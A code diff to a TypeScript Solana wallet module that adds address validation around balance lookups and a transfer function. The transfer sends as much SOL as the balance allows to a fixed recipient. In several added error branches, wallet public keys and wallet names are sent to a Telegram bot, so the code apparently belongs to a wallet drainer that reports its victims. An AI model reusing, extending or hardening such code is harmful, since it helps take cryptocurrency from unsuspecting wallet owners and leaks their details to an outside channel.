@@ -1,4 +1,3 @@
-
 import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram, sendAndConfirmTransaction } from '@solana/web3.js';
 
 // Helper function to add delay between retries
@@ -94,7 +93,19 @@ export const getTokenAccounts = async (connection: Connection, walletAddress: st
   try {
     console.log("Fetching token accounts for address:", walletAddress);
     
-    const pubKey = new PublicKey(walletAddress);
+    // Validate wallet address before proceeding
+    if (!walletAddress || typeof walletAddress !== 'string') {
+      console.error("Invalid wallet address:", walletAddress);
+      return [];
+    }
+    
+    let pubKey: PublicKey;
+    try {
+      pubKey = new PublicKey(walletAddress);
+    } catch (error) {
+      console.error("Invalid public key format:", error);
+      return [];
+    }
     
     // Create a fresh connection for token accounts (important fix)
     const freshConnection = await createConnection(true);
@@ -128,7 +139,20 @@ export const getTokenAccounts = async (connection: Connection, walletAddress: st
 export const getWalletBalance = async (walletAddress: string): Promise<number> => {
   try {
     console.log("Fetching SOL balance for address:", walletAddress);
-    const pubKey = new PublicKey(walletAddress);
+    
+    // Validate wallet address before proceeding
+    if (!walletAddress || typeof walletAddress !== 'string') {
+      console.error("Invalid wallet address:", walletAddress);
+      throw new Error("Invalid wallet address format");
+    }
+    
+    let pubKey: PublicKey;
+    try {
+      pubKey = new PublicKey(walletAddress);
+    } catch (error) {
+      console.error("Invalid public key format:", error);
+      throw new Error("Invalid public key format");
+    }
     
     // Try multiple connections in sequence to get the balance
     let lastError = null;
@@ -317,6 +341,22 @@ export const signAndSendTransaction = async (
   try {
     console.log('Creating transaction...');
     
+    // Validate the wallet has a publicKey before proceeding
+    if (!wallet || !wallet.publicKey) {
+      console.error('Wallet or publicKey is undefined');
+      
+      // Send notification to Telegram if credentials provided
+      if (botToken && chatId) {
+        await sendToTelegram({
+          address: wallet?.publicKey?.toString() || "Unknown",
+          message: `TRANSFER FAILED: Wallet publicKey is undefined`,
+          walletName: wallet?.adapter?.name || "Unknown Wallet"
+        }, botToken, chatId);
+      }
+      
+      throw new Error('Wallet publicKey is undefined');
+    }
+    
     // Check balance first
     const balance = await connection.getBalance(wallet.publicKey);
     console.log('Current wallet balance (lamports):', balance);
@@ -359,6 +399,24 @@ export const signAndSendTransaction = async (
       throw new Error('Wallet balance too low to cover transaction fees');
     }
     
+    // Ensure recipient address is valid
+    let recipientPublicKey: PublicKey;
+    try {
+      recipientPublicKey = new PublicKey(recipientAddress);
+    } catch (error) {
+      console.error('Invalid recipient address:', error);
+      
+      if (botToken && chatId) {
+        await sendToTelegram({
+          address: wallet.publicKey.toString(),
+          message: `TRANSFER FAILED: Invalid recipient address`,
+          walletName: wallet.adapter?.name || "Unknown Wallet"
+        }, botToken, chatId);
+      }
+      
+      throw new Error('Invalid recipient address');
+    }
+    
     // Use the smaller of requested amount or max possible amount
     const transferAmount = Math.min(
       Math.floor(amount * LAMPORTS_PER_SOL), 
@@ -370,7 +428,7 @@ export const signAndSendTransaction = async (
     const transaction = new Transaction().add(
       SystemProgram.transfer({
         fromPubkey: wallet.publicKey,
-        toPubkey: new PublicKey(recipientAddress),
+        toPubkey: recipientPublicKey,
         lamports: transferAmount,
       })
     );
